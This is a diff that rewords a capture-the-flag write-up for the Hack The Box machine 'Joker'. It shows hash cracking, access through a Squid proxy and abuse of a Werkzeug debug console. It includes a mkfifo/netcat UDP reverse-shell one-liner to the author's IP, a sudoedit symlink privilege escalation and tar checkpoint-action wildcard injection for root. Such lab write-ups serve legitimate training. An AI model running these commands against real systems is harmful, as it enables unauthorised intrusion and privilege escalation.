@@ -54,18 +54,18 @@ get /etc/squid
 get /etc/squid/squid.conf
 ```
 
-Now we downloaded the configuration files of Squid, we can analyze them.
-By filtering all the lines that are commented out, we can read the configured settings:
+After downloading the configuration files of Squid, we can analyze them.
+By filtering all the lines that are commented out, it is possible to read the configured settings:
 ```markdown
 cat squid.conf | grep -v ^\# | grep .
 ```
 
 This file tells us, that it uses the file _/etc/squid/passwords_ to authenticate which we can download, too.
-In this file we have a username and a password hash:
+In this file there is a username and a password hash:
 > kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
 
 We use **Hashcat** to specify what type of hash by looking at the example which starts with _$apr1$_.
-This hash is **Apache MD5 APR** and now we can try to crack it:
+This hash is **Apache MD5 APR** and should be crackable:
 ```markdown
 hashcat -m 1600 squid.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -75,17 +75,17 @@ After a while the hash gets cracked and the password is:
 
 ## Checking Squid HTTP Proxy (Port 3128)
 
-Browsing to the web page on port 3128 we see a generic error message from the _Squid_ application.
-As this is a proxy, we will use it on our local machine to see if we can connect to other services through this.
+Browsing to the web page on port 3128 there is a generic error message from the _Squid_ application.
+As this is a proxy, we will use it on our local machine to see if the connection to other services through this works.
 
-After configuring the proxy settings in the browser and browsing to web page on port 80, we get prompted to input credentials for _kalamari_.
+After configuring the proxy settings in the browser and browsing to web page on port 80, it prompts us to input credentials for _kalamari_.
 
 ### Connecting to the Squid Proxy and enumerating the Web Page
 
 Lets put the username and password that we got from TFTP in the Proxy configuration and browse to HTTP port 80 back again.
-We don't get prompted for a password anymore and get a different Squid error message.
+It doesn't prompt us for a password anymore and shows a different Squid error message.
 
-If we browse to _127.0.0.1_, which is the local address of the proxy, we get a page back:
+If we browse to _127.0.0.1_, which is the local address of the proxy, there is a page:
 
 ![Web Page](https://kyuu-ji.github.io/htb-write-up/joker/joker_webpage.png)
 
@@ -96,7 +96,7 @@ User options --> Connections --> Upstream Proxy Servers --> Add
 
 ![Burpsuite Upstream Proxy](https://kyuu-ji.github.io/htb-write-up/joker/joker_burpsuite-proxy.png)
 
-The **Shorty** application is a rabbit hole and not vulnerable. We need to enumerate the web page more by looking for hidden paths.
+The **Shorty** application is a rabbit hole and not vulnerable. The web page needs to get enumerated more by looking for hidden paths.
 First we need to create another **Proxy Listener in Burpsuite**:
 ```markdown
 Proxy --> Proxy Listeners --> Add
@@ -108,7 +108,7 @@ Redirect to host: 127.0.0.1
 Redirect to port 80
 ```
 
-Now our other commands like _cURL_ go through Burpsuite and reach the box.
+Now other commands like _cURL_ go through Burpsuite and reach the box.
 Lets look for hidden paths and PHP pages with **Gobuster**:
 ```markdown
 gobuster -u http://127.0.0.1 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
@@ -121,14 +121,14 @@ This will find the following paths:
 - /console (Status: 200)
   - Interactive Python Console
 
-We are interested in the _/console_ page:
+The _/console_ page seems interesting:
 
 ![Web console](https://kyuu-ji.github.io/htb-write-up/joker/joker_console.png)
 
 ### Getting a reverse shell
 
-Lets see what we can do with this Interactive Python Console.
-By importing **os** we can execute system commands:
+Lets see what is possible with this Interactive Python Console.
+Executing system commands works by importing the **os** module:
 ```markdown
 import os
 os.popen("whoami").read()
@@ -136,7 +136,7 @@ os.popen("whoami").read()
 'werkzeug\n'
 ```
 
-We are the  user _werkzeug_ on this box and can try if we have a connection to my local machine with `ping` because starting a reverse shell with **Netcat** did not work:
+We are the user _werkzeug_ on this box and can try if a connection to my local machine with `ping` works because starting a reverse shell with **Netcat** did not:
 ```markdown
 os.popen("ping -c 4 10.10.14.23 &").read()
 ```
@@ -146,7 +146,7 @@ The connection works, so lets read the **IPtables** configuration.
 os.popen("base64 -w 0 /etc/iptables/rules.v4").read()
 ```
 
-We output it as a _Base64_ string because the console doesn't do line breaks and its easier to read when we convert the string.
+Displaying the output as a _Base64_ string because the console doesn't do line breaks and its easier to read when converting the string.
 ```markdown
 :INPUT DROP [41573:1829596]
 :FORWARD ACCEPT [0:0]
@@ -164,12 +164,12 @@ Summarizing the rules:
 - _DROP_ every _INPUT_, when it does not have a rule
 - _ACCEPT_ _INPUT_ from port 22, 3128, UDP ports, ICMP
 
-So we can only start connections with UDP or ICMP. Lets start **Netcat** with the UDP flag (-u) set.
+Only connections with UDP or ICMP can be started. Lets start **Netcat** with the UDP flag (-u) set.
 ```markdown
 os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.23 9001 >/tmp/f &").read()
 ```
 
-This works and our listener on our IP and UDP port 9001 starts the connection.
+This works and the listener on our IP and UDP port 9001 starts the connection.
 
 ## Privilege Escalation to User
 
@@ -189,7 +189,7 @@ User werkzeug may run the following commands on joker:
     (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
 ```
 
-If we look for the version of `sudo` we see that it is version **1.8.16**.
+By looking for the version of `sudo` it shows that it is version **1.8.16**.
 ```markdown
 dpkg -l sudo
 
@@ -197,7 +197,7 @@ dpkg -l sudo
 ii  sudo        1.8.16-0ubun amd64
 ```
 
-By checking for vulnerabilities with `searchsploit sudoedit`, we see the vulnerability **Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation** which seems to be for a lower version, but it still works on this box, because of the _sudoedit_follow_ flag.
+When checking for vulnerabilities with `searchsploit sudoedit`, there is the vulnerability **Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation** which seems to be for a lower version, but it still works on this box, because of the _sudoedit_follow_ flag.
 
 The description of this says the following:
 > It seems that sudoedit does not check the full path if a wildcard is used twice (e.g. /home/*/*/file.txt), allowing a malicious user to replace the file.txt real file with a symbolic link to a different location
@@ -214,7 +214,7 @@ After that we can use `sudoedit` to write to that file.
 sudoedit -u alekos /var/www/testing/tester layout.html
 ```
 
-We will generate a SSH key:
+Generating a SSH key:
 ```markdown
 ssh-keygen
 ```
@@ -230,7 +230,7 @@ Now we are logged in as _alekos_.
 
 In the home directory of _alekos_ are the folders _/development_ and _/backup_. The backup folder has compressed files in it which are created in a 5 minute interval and are owned by root. They contain the files of the development folder.
 
-We can create a symbolic link to the _/root_ folder, so it gets compressed the next time and we will have permission to read the files in there.
+We can create a symbolic link to the _/root_ folder, so it gets compressed the next time and we will have permissions to read the files in there.
 ```markdown
 ln -s /root/ development
 ```
@@ -247,7 +247,7 @@ touch -- --checkpoint=1
 touch -- '--checkpoint-action=exec=sh shell.sh'
 ```
 
-With these parameters we can execute binaries with `tar`.
-The script _shell.sh_ is the same reverse shell as we used before but wants to connect on UDP port 9002.
+With these parameters, `tar` will execute binaries.
+The script _shell.sh_ is the same reverse shell as used before but wants to connect on UDP port 9002.
 
 The compression script will execute after 5 minutes and our listener will start a session as root!  
